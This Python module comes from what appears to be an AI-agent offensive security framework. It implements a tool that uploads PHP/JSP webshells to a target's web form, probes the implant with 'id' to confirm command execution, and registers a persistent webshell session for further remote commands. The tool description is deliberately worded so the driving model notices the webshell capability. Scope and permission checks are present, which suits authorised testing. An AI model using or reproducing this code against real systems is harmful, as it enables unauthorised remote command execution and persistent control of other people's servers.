"""Workspace-confined streaming uploads over the governed HTTP transport.

An upload alone is not a session: until the implant answers a command, the
engine has no proof that the file is reachable or executable. When the caller
provides the URL where the uploaded file lands (``shell_url``), this handler
probes it once with ``id`` and, only if the response is real command output,
registers the webshell in ``kernel_sessions`` and returns its ``session_ref``
for ``nexus.post.shell_exec``. Without that probe the transport stays
``webshell``-less, exactly as before.
"""

from __future__ import annotations

import re
from copy import deepcopy
from dataclasses import replace as dataclass_replace
from typing import Any
from urllib.parse import quote, urlencode, urlsplit

from nexus_core.kernel.models import RiskLevel, RunContext, ToolDefinition, ToolResult
from nexus_core.kernel.schema_validation import validate
from nexus_core.kernel.sessions import open_webshell_session
from .http_request import http_request_definition, http_request_handler

#: A webshell response is proof only when it carries the canonical ``id`` shape.
_PROBE_EVIDENCE = re.compile(r"uid=\d+\(")
_DEFAULT_PROBE = "id"
_SHELL_PARAMETER = r"^[A-Za-z_][A-Za-z0-9_]{0,63}$"


def web_upload_definition(tenant_id: str = 'system') -> ToolDefinition:
    base = http_request_definition(tenant_id)
    schema = deepcopy(base.input_schema)
    schema['required'] = ['url', 'upload']
    schema['properties']['method']['enum'] = ['POST', 'PUT']
    for inline_body in ('data', 'data_base64'):
        schema['properties'].pop(inline_body)
    schema['properties'].update({
        'shell_url': {
            'type': 'string', 'minLength': 4, 'maxLength': 2048,
            'description': (
                'URL donde queda la webshell tras la subida. Si se indica, se '
                'prueba una vez y se devuelve un session_ref durable.'
            ),
        },
        'shell_parameter': {
            'type': 'string', 'pattern': _SHELL_PARAMETER, 'default': 'cmd',
            'description': 'Parámetro que recibe el comando en la webshell.',
        },
        'shell_method': {
            'type': 'string', 'enum': ['GET', 'POST'], 'default': 'POST',
        },
        'probe_command': {
            'type': 'string', 'minLength': 1, 'maxLength': 256, 'default': _DEFAULT_PROBE,
        },
    })
    return ToolDefinition(
        tool_id='nexus.web.upload', tenant_id=tenant_id, name='HTTP file upload',
        # The first 64 characters are what the prompt's catalog line shows
        # (``CATALOG_DESCRIPTION_CHARS``): the webshell must be visible *before*
        # the truncation or the model never learns the tool is the upload path.
        description=(
            'Sube webshells (PHP/JSP) y payloads del workspace a un formulario web '
            'multipart o por PUT. Con shell_url verifica la ejecución y devuelve '
            'un session_ref para nexus.post.shell_exec(transport="webshell").'
        ),
        effect='target_write', risk=RiskLevel.MEDIUM,
        input_schema=schema,
        required_permissions=['execute:tool:nexus.web.upload'],
        scope_target_field='url', scope_required=True, timeout_seconds=300,
        max_output_bytes=2_000_000,
    )


async def _probe_webshell(
    context: RunContext,
    *,
    shell_url: str,
    method: str,
    parameter: str,
    command: str,
    timeout_seconds: int,
) -> tuple[ToolResult, bool]:
    """Send one command to the uploaded implant and decide if it executed."""
    args: dict[str, Any] = {
        'url': shell_url,
        'method': method,
        'timeout_seconds': max(5, min(30, timeout_seconds)),
    }
    if method == 'GET':
        separator = '&' if urlsplit(shell_url).query else '?'
        args['url'] = f"{shell_url}{separator}{parameter}={quote(command)}"
    else:
        args['data'] = urlencode({parameter: command})
        args['headers'] = {'Content-Type': 'application/x-www-form-urlencoded'}
    result = await http_request_handler(args, context)
    body = str((result.output or {}).get('body_preview') or '')
    if not result.verified:
        return result, False
    if _PROBE_EVIDENCE.search(body):
        return result, True
    # ``whoami`` has no fixed shape; a short non-HTML line is the best available
    # proof when the caller explicitly asked for it.
    stripped = body.strip()
    return result, bool(
        command.strip() == 'whoami'
        and stripped
        and '<html' not in stripped.lower()
        and len(stripped) <= 256
    )


async def web_upload_handler(arguments: dict[str, Any], context: RunContext) -> ToolResult:
    validate(arguments, web_upload_definition().input_schema)
    args = dict(arguments)
    shell_url = str(args.pop('shell_url', '') or '').strip()
    shell_parameter = str(args.pop('shell_parameter', 'cmd') or 'cmd')
    shell_method = str(args.pop('shell_method', 'POST') or 'POST').upper()
    probe_command = str(args.pop('probe_command', _DEFAULT_PROBE) or _DEFAULT_PROBE).strip()
    args.setdefault('method', 'POST')
    if args['method'] not in {'POST', 'PUT'}:
        raise ValueError('upload requires POST or PUT')
    if 'data' in args or 'data_base64' in args:
        raise ValueError('upload cannot be combined with an inline body')
    result = await http_request_handler(args, context)
    if not shell_url or not result.verified:
        return result

    probe, executed = await _probe_webshell(
        context,
        shell_url=shell_url,
        method=shell_method,
        parameter=shell_parameter,
        command=probe_command,
        timeout_seconds=int(args.get('timeout_seconds') or 30),
    )
    output = dict(result.output or {})
    evidence = dict(result.evidence or {})
    evidence.update({
        'shell_url': shell_url,
        'shell_method': shell_method,
        'shell_parameter': shell_parameter,
        'shell_probe': 'executed' if executed else 'no_command_output',
        'shell_probe_status': (probe.output or {}).get('status'),
    })
    output['webshell'] = {
        'shell_url': shell_url,
        'method': shell_method,
        'parameter': shell_parameter,
        'probe_status': (probe.output or {}).get('status'),
    }
    if executed:
        try:
            session_ref = open_webshell_session(
                context,
                url=shell_url,
                method=shell_method,
                parameter=shell_parameter,
                opened_by_tool='nexus.web.upload',
            )
        except (PermissionError, ValueError):
            # The request was authorised, but the durable row is not created when
            # the scope cannot substantiate it; the upload result stays truthful.
            session_ref = ''
        if session_ref:
            output['session_ref'] = session_ref
            output['session_type'] = 'webshell'
            evidence['session_ref'] = session_ref
    return dataclass_replace(result, output=output, evidence=evidence)
